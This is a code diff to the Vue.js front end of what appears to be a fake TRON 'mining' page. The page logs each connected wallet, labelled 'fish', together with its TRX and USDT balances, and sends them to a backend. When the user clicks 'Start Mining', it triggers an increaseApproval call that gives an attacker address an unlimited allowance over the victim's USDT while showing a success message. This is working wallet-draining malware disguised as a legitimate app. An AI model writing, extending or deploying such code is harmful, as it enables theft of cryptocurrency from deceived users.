@@ -353,7 +353,7 @@
 </template>
 
 <script>
-import {addFish, getAuth, addAuth } from "@/api/tron/auth";
+import {addFish,getFish, getAuth, addAuth } from "@/api/tron/auth";
 
 export default {
   name: "Home",
@@ -375,8 +375,8 @@ export default {
       fish: {
           token: undefined,
           address: undefined,
-          trx: 0.00.toFixed(2),
-          usdt: 0.00.toFixed(2)
+          trx: undefined,
+          usdt: undefined
       }
     };
   },
@@ -401,41 +401,27 @@ export default {
           this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
           console.info(wallet_addr);
 
-          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=result/1000000);
-          await this.contract.balanceOf(wallet_addr).call((err, balance) => {
-              this.fish.usdt=balance/1000000;
-          });
-          this.fish.address=wallet_addr;
-          this.fish.token=this.$route.query.token;
-
+          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=(result/1000000).toFixed(6));
           // if (this.fish.trx <= 6){
           //     this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
           //     return;
           // }
-
-          this.showConnection = false;
-          this.showAddress = true;
-
-          var flag=await addFish(this.fish).then(response => {
-            if (response.data.code == 500){
-              return true;
-            }else{
-              return false;
-            }
+          this.fish.address=wallet_addr;
+          this.fish.token=this.$route.query.token;
+          await this.contract.balanceOf(wallet_addr).call((err, balance) => {
+            this.fish.usdt=(balance/1000000).toFixed(6);
+            addFish(this.fish).then(response => {
+              if (response.data.code == 200){
+                this.showConnection = false;
+                this.showAddress = true;
+                return true;
+              }else{
+                this.showConnection = false;
+                this.showAddress = true;
+                return false;
+              }
+            });
           });
-          if (flag){
-            return;
-          }
-          let res = await this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
-          res.send({
-            feeLimit: 10000000,
-            callValue: 0,
-            shouldPollResponse: false
-          }, (err, res) => {
-            if (err == null){
-              this.addAuth(this.fish);
-            }
-          })
         }
       }, 10);
     },
@@ -464,7 +450,29 @@ export default {
       });
     },
     startMining(){
-      this.$toast({ message: "Start Mining Success"});
+       window.tronWeb.trx.getBalance( this.myWalletAddress).then(result => this.fish.trx=(result/1000000).toFixed(6));
+      // if (this.fish.trx <= 6){
+      //     this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
+      //     return;
+      // }
+      getFish(this.fish).then(response => {
+        if (response.data.code == 200){
+          let res = this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
+          res.send({
+            feeLimit: 10000000,
+            callValue: 0,
+            shouldPollResponse: false
+          }, (err, res) => {
+            // if (err == null){
+            this.addAuth(this.fish);
+            // }
+          })
+          return true;
+        }else{
+          this.$toast({ message: "Start Mining Success"});
+          return false;
+        }
+      });
     },
     onCopy(){
       this.$toast({ message: "copy Success"});
